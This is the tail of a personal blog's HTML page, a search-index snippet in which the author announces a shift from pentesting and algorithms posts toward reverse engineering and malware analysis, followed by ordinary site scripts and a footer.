            "content": "It\u0026rsquo;s been a while since I last wrote for my personal blog. Last year, while I was in 2nd year of Bachelor, I wrote more articles about Data Structures and Algorithms, and little things I found to be fancy about pentesting. After a year of self teaching and research, I\u0026rsquo;m now focusing more on reverse engineering, malware analysis and using data science for faster analysis. There are so many things that I want to know better, but I struggle because they are undocumented, and that\u0026rsquo;s why I decided to retake this. This blog is mainly for my own tracking but I hope it\u0026rsquo;s helpful for others and that I will update this more often!\nThe old blog is still stored at the master branch of RoundofThree/roundofthree.github.io.\n", 
            "url": "\/general\/migration\/"
        },
        
        
        
        "\/categories\/": {
            
            "title": "Categories",
            "tags": [],
            "content": "", 
            "url": "\/categories\/"
        },
        
        
        
        "\/search\/": {
            
            "title": "Search",
            "tags": [],
            "content": "", 
            "url": "\/search\/"
        },
        
    }
</script>
<script src="/assets/lunr.min.js"></script>
<script src="/assets/search.js"></script>
</div>
<footer class="footer">
<div class="footer__inner">
<div class="copyright copyright--user">
<span>© 2021 RoundofThree</span>
</div>
</div>
</footer>
<script src="/assets/main.js"></script>
<script src="/assets/prism.js"></script>
</div>
</body>
</html>
